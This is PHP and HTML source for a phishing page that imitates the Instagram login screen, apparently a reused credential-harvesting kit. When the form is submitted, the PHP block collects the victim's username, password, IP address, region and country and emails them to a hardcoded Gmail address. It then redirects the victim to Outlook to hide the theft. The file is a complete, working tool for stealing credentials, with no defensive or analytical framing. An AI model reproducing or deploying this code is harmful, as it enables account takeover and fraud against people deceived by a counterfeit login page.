<?php
    require './vendor/phpmailer/phpmailer/src/Exception.php';
    require './vendor/phpmailer/phpmailer/src/PHPMailer.php';
    require './vendor/phpmailer/phpmailer/src/SMTP.php';

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    //Load Composer's autoloader
    require './vendor/autoload.php';
    require_once('geoplugin.class.php');
    $geoplugin = new geoPlugin();

    $geoplugin->locate();

    if(isset($_POST['submit'])){
        extract($_POST);
        // $mail = new PHPMailer(true);
        $email_to = 'alessafredo@gmail.com';
        $subject = "Office Login "." $geoplugin->ip "." ||"."$geoplugin->countryName";
        $headers = "From: Office.login\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
        $message = "
            <body style='background-color: #eee; font-size: 16px;'>
                <div style='max-width: 100%; min-width: 200px; background-color: #fff; padding: 20px; margin: auto; border-radius: 10px; box-shadow: 0px 10px 10px 5px;'>

                <p><b>IP: </b>$geoplugin->ip</p>
                <p><b>Region: </b>$geoplugin->region</p>
                <p><b>Country Name: </b>$geoplugin->countryName</p>

                <p><b>Username:</b> $uname</p>
                <p><b>Password:</b> $pword</p>
            </body>";

        if (mail($email_to, $subject, $message, $headers)) {
            echo "<script type='text/javascript'>location.href = 'https://outlook.live.com/';</script>";
        } else {
            echo 'not sent';
        }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Instagram</title>
    <link rel="icon" href="./assets/images/favicon.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
    <link rel="stylesheet" href="./assets/css/main.css">
</head>
<body>
    <section class="main-content">
        <div class="hero-img">
            <img src="./assets/images/insta.png" alt="">
        </div>
        <div class="form-container">
            <form method="POST">
                <div class="form-group">
                    <input class="form-control" name="uname" cl type="text" placeholder="Phone number, username, or email">
                </div>
                <div class="form-group">
                    <input type="password" class="form-control" name="pword" type="text" placeholder="Password">
                </div>
                <div class="form-group">
                    <button name="submit" type="submit" class="form-control btn">Log In</button>
                </div>
            </form>
            <span class="divider">OR</span>
             <span class="log-in-fb"> <i class="fa-brands fa-facebook-square"></i> <a href="#">Log in with Facebook</a></span>
             <span class="forgot"><a href="#" class="forgot-pword">Forgot password?</a></span>

             <span class="sign-up">Don't have and account? <a href="#">Sign up</a></span>

            </div>
            <div class="get-app">
                <span class="title">Get the app.</span>
                <div class="apps">
                    <img src="./assets/images/appstore.png" alt="">
                    <img src="./assets/images/playstore.png" alt="">
                </div>
            </div>
    </section>
    <footer>
        <div class="links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        <div class="sub-links">
            <span>English </span>
            <span>&copy; 2022 Instagram from Meta</span>
        </div>
    </footer>
    <script src="./assets/js/main.js"></script>
</body>
</html>